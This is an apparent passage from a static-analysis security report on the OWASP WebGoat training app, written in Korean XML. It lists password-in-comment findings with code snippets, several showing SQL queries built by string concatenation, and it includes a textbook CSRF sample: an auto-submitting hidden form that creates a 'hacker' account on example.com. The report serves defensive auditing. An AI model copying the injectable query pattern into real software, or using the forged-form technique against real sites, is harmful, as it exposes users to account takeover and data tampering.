<Value>암호는 하드코드해서는 안 되며 보통 난독 처리하여 외부 소스에서 관리해야 합니다. 시스템의 임의의 장소에 암호를 일반 텍스트로 저장하면 권한이 있는 사용자라면 누구나 암호를 읽어 남용할 가능성이 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>29</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA75" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>135</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA77" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>121</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA6D" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>100</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="63FDA39339AABEFFDAFC338CF3882126" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>149</LineStart>
<Snippet>	try
	{
	    // Note: The password field is ONLY set by ChangePassword
	    String query = "UPDATE employee SET first_name = '"
		    + employee.getFirstName() + "', last_name = '"</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA73" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>161</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="28B72891B4552F5DD8F0964834D3AC43" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>102</LineStart>
<Snippet>	    {
		// We make sure the username was submitted to avoid telling the user an invalid
		// username/password was entered when they first enter the lesson via the side menu.
		// This also suppresses the error if they just hit the login and both fields are empty.
		if (username.length() != 0)</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA74" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/FindProfile.java</FilePath>
<LineStart>152</LineStart>
<Snippet>		{
		    int id = answer_results.getInt("userid");
		    // Note: Do NOT get the password field.
		    profile = new Employee(id, answer_results
			    .getString("first_name"), answer_results</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA76" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>195</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2032FFDA1ACE66CF7BF8140FEDEF58A6" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BasicAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BasicAuthentication.java</FilePath>
<LineStart>258</LineStart>
<Snippet>

    /**
     *  Gets the category attribute of the ForgotPassword object
     *</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="63FDA39339AABEFFDAFC338CF3882124" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>107</LineStart>
<Snippet>	try
	{
	    // Note: The password field is ONLY set by ChangePassword
	    String query = "DELETE FROM employee WHERE userid = " + employeeId;
	    //System.out.println("Query:  " + query);</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA72" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>100</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="63FDA39339AABEFFDAFC338CF3882123" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>270</LineStart>
<Snippet>	try
	{
	    // Note: The password field is ONLY set by ChangePassword
	    String query = "UPDATE employee SET first_name = '"
		    + employee.getFirstName() + "', last_name = '"</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2032FFDA1ACE66CF7BF8140FEDEF58A8" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ForcedBrowsing.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ForcedBrowsing.java</FilePath>
<LineStart>103</LineStart>
<Snippet>

    /**
     *  Gets the category attribute of the ForgotPassword object
     *</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2032FFDA1ACE66CF7BF8140FEDEF58AA" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RemoteAdminFlaw.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RemoteAdminFlaw.java</FilePath>
<LineStart>69</LineStart>
<Snippet>

    /**
     *  Gets the category attribute of the ForgotPassword object
     *</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FA2E59EFE5B8C6E2A801F7C450DB6779" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ECSFactory.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ECSFactory.java</FilePath>
<LineStart>169</LineStart>
<Snippet>		.setMaxlength(size);

	// double check in case someone means to make a * starred out password field

	if (name.equals(PASSWORD))</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA6F" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FindProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/FindProfile.java</FilePath>
<LineStart>184</LineStart>
<Snippet>		{
		    int id = answer_results.getInt("userid");
		    // Note: Do NOT get the password field.
		    profile = new Employee(id, answer_results
			    .getString("first_name"), answer_results</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="63FDA39339AABEFFDAFC338CF3882125" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>136</LineStart>
<Snippet>	try
	{
	    // Note: The password field is ONLY set by ChangePassword
	    String query = "DELETE FROM employee WHERE userid = " + employeeId;
	    //System.out.println("Query:  " + query);</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="63FDA39339AABEFFDAFC338CF3882122" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>221</LineStart>
<Snippet>	try
	{
	    // Note: The password field is ONLY set by ChangePassword
	    String query = "UPDATE employee SET first_name = '"
		    + employee.getFirstName() + "', last_name = '"</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="83F06CD8F02FEA5F506B1C33E9C723D5" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Course.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Course.java</FilePath>
<LineStart>76</LineStart>
<Snippet>    }
    
    /**
     * Take an absolute file and return the filename.
     * </Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA70" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>115</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5CC6F221C368158E158C40EA7AD04851" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>98</LineStart>
<Snippet>	    }

	    // Don't let the fail open pass with a blank password.
	    if (password.length() == 0)
	    {</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="63FDA39339AABEFFDAFC338CF3882127" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>198</LineStart>
<Snippet>	try
	{
	    // Note: The password field is ONLY set by ChangePassword
	    String query = "UPDATE employee SET first_name = '"
		    + employee.getFirstName() + "', last_name = '"</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2032FFDA1ACE66CF7BF8140FEDEF58A9" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ForgotPassword.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ForgotPassword.java</FilePath>
<LineStart>285</LineStart>
<Snippet>

    /**
     *  Gets the category attribute of the ForgotPassword object
     *</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA78" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>181</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA71" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>175</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4881C1A9E2A09BF6D6243B886530CA6E" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>158</LineStart>
<Snippet>		if (answer_results.next())
		{
		    // Note: Do NOT get the password field.
		    profile = new Employee(answer_results.getInt("userid"),
			    answer_results.getString("first_name"),</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4E084D90439ADCDF912AD2BB626904C3" ruleID="7CE9D4DF-5D0C-49AE-ABC0-5D5632965FED">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>build.xml</FileName>
<FilePath>build.xml</FilePath>
<LineStart>73</LineStart>
<Snippet>                       "manager" role (so that he or she can execute
                       commands via the "/manager" web application)
--&gt;

  &lt;property name="app.name"      		   value="WebGoat"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="2032FFDA1ACE66CF7BF8140FEDEF58A7" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BufferOverflow.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BufferOverflow.java</FilePath>
<LineStart>59</LineStart>
<Snippet>

    /**
     *  Gets the category attribute of the ForgotPassword object
     *</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2672B79A28F1D268BE0BE4510ECA2F0D" ruleID="720E3A66-55AC-4D2D-8DB9-DC30E120A52F">
                            <Category>Password Management: Password in Comment</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>암호 또는 암호 세부 정보를 시스템 또는 시스템 코드 안에 일반 텍스트로 저장하는 것은 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>139</LineStart>
<Snippet>

    /**
     *  Determine the username and password
     *</Snippet>
<TargetFunction>Comment()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="27">
                        <groupTitle>Cross-Site Request Forgery</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>EditProfile.jsp 파일의 10 줄에 있는 폼 게시에는 공격자의 무단 요청을 막기 위한 사용자 특정 기밀이 포함되어 있어야 합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>CSRF(cross-site request forgery) 취약점은 다음 경우에 발생합니다.
1. 웹 응용 프로그램이 세션 쿠키를 사용합니다.

2. 응용 프로그램이 해당 요청이 사용자의 동의 하에 이루어졌는지 확인하지 않고 HTTP 요청에 대해 작업합니다.



Nonce는 재전송 공격을 막기 위해 메시지와 함께 전송된 암호화 무작위 값입니다. 요청에 출처를 증명하는 정보가 포함되어 있지 않은 경우, 해당 요청을 처리하는 코드는 CSRF 공격에 취약합니다(응용 프로그램의 상태를 변경하지 않는 경우 제외). 이는 공격자가 사용자로 하여금 허위 요청을 제출하도록 속이지 못하게 하려면 세션 쿠키를 사용하는 웹 응용 프로그램이 특별한 예방 조치를 취해야 한다는 의미입니다. 관리자가 다음과 같은 폼을 제출하여 새로운 계정을 생성하도록 허용하는 웹 응용 프로그램을 상상해 보십시오.


&lt;form method="POST" action="/new_user" &gt;
  Name of new user: &lt;input type="text" name="username"&gt;
  Password for new user: &lt;input type="password" name="user_passwd"&gt;
    &lt;input type="submit" name="action" value="Create User"&gt;
&lt;/form&gt;


공격자는 다음과 같이 웹 사이트를 설정할 수도 있습니다.


&lt;form method="POST" action="http://www.example.com/new_user"&gt;
  &lt;input type="hidden" name="username" value="hacker"&gt;
  &lt;input type="hidden" name="user_passwd" value="hacked"&gt;
&lt;/form&gt;
&lt;script&gt;
  document.usr_form.submit();
&lt;/script&gt;


예를 들어 example.com의 관리자가 사이트에서 세션을 활성화한 상태에서 악성 페이지를 방문하는 경우 무의식적으로 공격자를 위한 계정을 만들게 됩니다. 이것이 CSRF 공격입니다. 이는 응용 프로그램이 해당 요청의 출처를 확인하는 방법을 가지고 있지 않기 때문입니다. 모든 요청은 사용자가 선택한 적법한 작업이거나 공격자가 설정한 허위 작업일 가능성이 있습니다. 공격자는 허위 요청이 생성하는 웹 페이지를 보지 못하므로 이 공격 기법은 응용 프로그램의 상태를 변경하는 요청의 경우에만 유용합니다.

하지만 세션 ID를 쿠키가 아닌 URL에서 전달하는 응용 프로그램은 공격자가 세션 ID에 접근하여 허위 요청의 일부로 포함시킬 방법이 없으므로 CSRF 문제가 발생하지 않습니다.

CSRF는 2007 OWASP Top 10 목록에서 제 5위입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>세션 쿠키를 사용하는 응용 프로그램은 백엔드 코드가 요청의 출처를 검증하는 데 사용하는 모든 폼 게시에 약간의 정보를 포함시켜야 합니다. 이렇게 하는 방법 중 하나는 다음과 같이 임의의 요청 ID 또는 Nonce를 포함시키는 것입니다.


